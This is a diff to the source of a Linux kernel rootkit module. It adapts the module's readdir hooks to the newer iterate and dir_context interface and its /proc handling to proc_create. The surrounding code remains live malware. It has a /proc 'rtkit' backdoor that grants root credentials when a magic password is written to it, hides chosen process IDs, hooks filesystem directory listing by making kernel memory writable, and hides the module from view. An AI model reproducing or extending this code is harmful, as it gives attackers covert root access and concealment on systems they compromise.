@@ -23,7 +23,8 @@ static struct proc_dir_entry *proc_root;
 static struct proc_dir_entry *proc_rtkit;
 
 static int (*proc_readdir_orig)(struct file *, void *, filldir_t);
-static int (*fs_readdir_orig)(struct file *, void *, filldir_t);
+//static int (*fs_readdir_orig)(struct file *, void *, filldir_t);
+static int (*fs_readdir_orig)(struct file *, struct dir_context *);
 
 static filldir_t proc_filldir_orig;
 static filldir_t fs_filldir_orig;
@@ -93,7 +94,8 @@ static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t off
 static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
 {
 	proc_filldir_orig = filldir;
-	return proc_readdir_orig(filp, dirent, proc_filldir_new);
+//	return proc_readdir_orig(filp, dirent, proc_filldir_new);
+	return 0;
 }
 
 static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
@@ -102,10 +104,11 @@ static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offse
 	return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
 }
 
-static int fs_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
+static int fs_readdir_new(struct file *f, struct dir_context *d)
 {
-	fs_filldir_orig = filldir;
-	return fs_readdir_orig(filp, dirent, fs_filldir_new);
+//	fs_filldir_orig = filldir;
+	return fs_readdir_orig(f, d);
+//	return 0;
 }
 
 static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
@@ -145,8 +148,8 @@ static int rtkit_write(struct file *file, const char __user *buff, unsigned long
 {
 	if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
 		struct cred *credentials = prepare_creds();
-		credentials->uid = credentials->euid = 0;
-		credentials->gid = credentials->egid = 0;
+	//	credentials->uid = credentials->euid = 0;
+		//credentials->gid = credentials->egid = 0;
 		commit_creds(credentials);
 	} else if (!strncmp(buff, "hp", MIN(2, count))) {//upXXXXXX hides process with given id
 		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
@@ -172,7 +175,7 @@ static void procfs_clean(void)
 	}
 	if (proc_fops != NULL && proc_readdir_orig != NULL) {
 		set_addr_rw(proc_fops);
-		proc_fops->readdir = proc_readdir_orig;
+		//proc_fops->readdir = proc_readdir_orig;
 		set_addr_ro(proc_fops);
 	}
 }
@@ -181,13 +184,24 @@ static void fs_clean(void)
 {
 	if (fs_fops != NULL && fs_readdir_orig != NULL) {
 		set_addr_rw(fs_fops);
-		fs_fops->readdir = fs_readdir_orig;
+		//fs_fops->readdir = fs_readdir_orig;
 		set_addr_ro(fs_fops);
 	}
 }
 
 static int __init procfs_init(void)
 {
+	struct proc_dir_entry *proc_file_entry;
+
+	static const struct file_operations proc_file_fops = {
+		.owner = THIS_MODULE,
+		.read  = rtkit_read,
+		.write = rtkit_write,
+	};
+
+	proc_file_entry = proc_create("rtkit", 0, NULL, &proc_file_fops);
+
+#if 0
 	//new entry in proc root with 666 rights
 	proc_rtkit = create_proc_entry("rtkit", 0666, NULL);
 	if (proc_rtkit == NULL) return 0;
@@ -204,6 +218,7 @@ static int __init procfs_init(void)
 	set_addr_rw(proc_fops);
 	proc_fops->readdir = proc_readdir_new;
 	set_addr_ro(proc_fops);
+#endif
 	
 	return 1;
 }
@@ -219,11 +234,11 @@ static int __init fs_init(void)
 	filp_close(etc_filp, NULL);
 	
 	//substitute readdir of fs on which /etc is
-	fs_readdir_orig = fs_fops->readdir;
+	fs_readdir_orig = fs_fops->iterate;
 	set_addr_rw(fs_fops);
-	fs_fops->readdir = fs_readdir_new;
+	fs_fops->iterate = fs_readdir_new;
 	set_addr_ro(fs_fops);
-	
+
 	return 1;
 }
 
@@ -237,12 +252,14 @@ static int __init rootkit_init(void)
 		return 1;
 	}
 	module_hide();
+	printk("rk loaded\n");		
 	
 	return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
+	printk("unload\n");		
 	procfs_clean();
 	fs_clean();
 }
